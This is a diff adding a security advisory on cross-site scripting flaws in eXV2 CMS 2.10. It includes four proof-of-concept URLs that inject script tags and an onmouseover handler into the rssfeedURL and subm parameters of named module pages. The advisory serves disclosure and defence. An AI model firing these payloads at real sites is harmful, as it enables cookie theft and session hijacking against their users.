@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/44169/info
+
+eXV2 CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+eXV2 CMS 2.10 is vulnerable; other versions may also be affected.
+
+http://www.example.com/manual/caferss/example.php?rssfeedURL="%20onmouseover=prompt(1)%20xss="&submit=OK
+http://www.example.com/modules/news/archive.php?subm="><script>alert(1)</script>
+http://www.example.com/modules/news/topics.php?subm="><script>alert(1)</script>
+http://www.example.com/modules/contact/index.php?op=contact&subm="><script>alert(1)</script>
